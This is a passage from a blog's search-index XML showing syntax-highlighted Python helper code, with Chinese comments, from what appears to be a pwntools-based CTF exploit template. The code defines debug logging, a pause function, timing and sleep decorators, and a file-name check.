</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> LOCAL_LOG:</span><br><span class="line">        # 利用eval函数, 首先检索一下</span><br><span class="line">        <span class="keyword">if</span> addr_name in globals() or addr_name in vars():</span><br><span class="line">            tmp_var = eval(addr_name)</span><br><span class="line">            <span class="built_in">log</span>.success(<span class="string">&quot;&#123;&#125; ===&gt; &#123;&#125;&quot;</span>.format(addr_name, hex(tmp_var)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">log</span>.warn(<span class="string">&quot;No variable named: &#x27;&quot;</span> + addr_name + <span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pass</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def STOP():</span><br><span class="line">    <span class="keyword">if</span> not STOP_FUNCTION:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    print(<span class="string">&quot;stop...&#123;&#125;  &#123;&#125;&quot;</span>.format(sys._getframe().f_lineno, proc.pidof(io)))</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">############### 定义一些偏函数 ###################</span><br><span class="line"></span><br><span class="line">int16 = functools.partial(<span class="type">int</span>, base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">#################### END ########################</span><br><span class="line"></span><br><span class="line">############### 定义一些装饰器函数 ##############<span class="meta">#</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">def time_count(func):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    装饰器：统计函数运行时间</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    @functools.wraps(func)</span><br><span class="line">    def wrapper(*args, **kwargs):</span><br><span class="line">        print(<span class="string">&#x27;=&#x27;</span> * <span class="number">50</span>)</span><br><span class="line">        print(<span class="string">&#x27;function #&#123;&#125;# start...&#x27;</span>.format(func.__name__))</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = func(*args, **kwargs)</span><br><span class="line">        end = time.time()</span><br><span class="line">        print(<span class="string">&#x27;function #&#123;&#125;# end...execute time: &#123;&#125; s / &#123;&#125; min&#x27;</span>.format(func.__name__, end - start, (end - start) / <span class="number">60</span>))</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line">def sleep_call(second:<span class="type">int</span>=<span class="number">1</span>, mod:<span class="type">int</span>=<span class="number">1</span>):</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    装饰器：在调用函数前后线程先睡眠指定秒数</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        second: 休眠秒数</span></span><br><span class="line"><span class="string">        mod: 0 不休眠; 1 为调用前休眠; 2 为调用后休眠; 3 为前后均修眠</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> mod &gt; <span class="number">3</span> or mod &lt; <span class="number">0</span>:</span><br><span class="line">        mod = <span class="number">1</span></span><br><span class="line">    def wrapper1(func):</span><br><span class="line">        @functools.wraps(func)</span><br><span class="line">        def wrapper2(*args, **kwargs):</span><br><span class="line">            <span class="keyword">if</span> mod &amp; <span class="number">1</span>:</span><br><span class="line">                time.sleep(second)</span><br><span class="line">            res = func(*args, **kwargs)</span><br><span class="line">            <span class="keyword">if</span> mod &amp; <span class="number">2</span>:</span><br><span class="line">                time.sleep(second)</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">return</span> wrapper2</span><br><span class="line">    <span class="keyword">return</span> wrapper1</span><br><span class="line">    </span><br><span class="line">#################### END #######################<span class="meta">#</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">context.update(log_level=PWN_LOG_LEVEL)</span></span><br><span class="line"></span><br><span class="line"># 一般需要带上文件，可注释改行语句</span><br><span class="line">assert FILENAME is not None, <span class="string">&#x27;give me a file!&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
